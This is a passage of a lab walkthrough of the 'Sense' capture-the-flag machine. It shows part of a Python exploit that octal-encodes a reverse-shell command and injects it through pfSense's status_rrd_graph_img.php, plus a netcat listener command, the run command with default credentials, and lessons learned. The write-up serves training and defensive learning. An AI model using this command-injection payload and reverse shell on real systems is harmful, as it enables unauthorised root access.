<span class="lineno" data-linenos="12 "></span>&quot;&quot;&quot; % (lhost, lport)`
<span class="lineno" data-linenos="13 "></span>
<span class="lineno" data-linenos="14 "></span>`payload = &quot;&quot;
<span class="lineno" data-linenos="15 "></span>
<span class="lineno" data-linenos="16 "></span># encode payload in octal
<span class="lineno" data-linenos="17 "></span>for char in command:
<span class="lineno" data-linenos="18 "></span>    payload += (&quot;\\&quot; + oct(ord(char)).lstrip(&quot;0o&quot;))
<span class="lineno" data-linenos="19 "></span>
<span class="lineno" data-linenos="20 "></span>login_url = &#39;https://&#39; + rhost + &#39;/index.php&#39;
<span class="lineno" data-linenos="21 "></span>exploit_url = &quot;https://&quot; + rhost + &quot;/status_rrd_graph_img.php?database=queues;&quot;+&quot;printf+&quot; + &quot;&#39;&quot; + payload + &quot;&#39;|sh&quot;
<span class="lineno" data-linenos="22 "></span>......`
</pre></div>

<p>It seems that the status_rrd_graph_img.php script is vulnerable to a command injection. To exploit that, the script is passing a simple python reverse shell (with the configuration parameters we pass as arguments) as a command. It does octal encode the reverse shell command which leads me to believe that there is either some form of filtering being done at the backend or the application crashes on certain characters. To sum up, it’s a very simple script that sends a reverse shell back to our attack machine.</p>
<p>Therefore, let’s up a listener to receive the shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 1234
</pre></div>

<p>Then run the exploit.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 1234 --username rohit --password pfsense
</pre></div>

<p>We have a shell!</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_HlkTLkGA2OYf6Nthu8ISUw.png" /></p>
<p>For this machine, we don’t have to escalate privileges since pfSense is running as root and therefore when we exploited the command injection vulnerability we got a shell with root privileges.</p>
<p>View the user.txt and root.txt flags.</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_PjJO-DHzn0zFlKLW9TP7ew.png" /></p>
<p>It’s worth noting that this can be easily done manually and is a good exercise for machines that don’t have scripts to automate the exploit.</p>
<h1 id="lessons-learned">Lessons Learned</h1>
<p>To gain an initial foothold on the box we exploited three vulnerabilities.</p>
<ol>
<li>
<p>Information disclosure. The changelog.txt &amp; system-users.txt files were publicly available to anyone that enumerates the directories on the webserver. Those files gave us information about the vulnerabilities in the web server and credential information for one of the accounts. Administrators should never publicly store sensitive information.</p>
</li>
<li>
<p>Use of default credentials. The user used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack.</p>
</li>
<li>
<p>Command injection in the pfSense software that allowed us to send a shell back to our attack server. This could have been avoided if the user had patched the system and installed the most recent version of pfSense.</p>
</li>
</ol>
<p>As mentioned earlier, we didn’t have to escalate privileges for this box since pfSense runs with root privileges and therefore we got a shell with root privileges.</p>
<h1 id="conclusion">Conclusion</h1>
<p>18 machines down, 29 more to go!</p>
<p><img alt="" src="../../img/Sense Writeup wo Metasploit/1_Z7EBl8dmiloKV2b6pjRiQw.png" /></p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                25. Netmon Writeup.md
              </span>
            </div>
          </a>
        
        
          <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                27. Sunday Writeup w/o Metasploit.md
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
    
      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
    
      <a href="" class="md-footer-social__link fa fa-"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
        <script src="../../js/katex.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>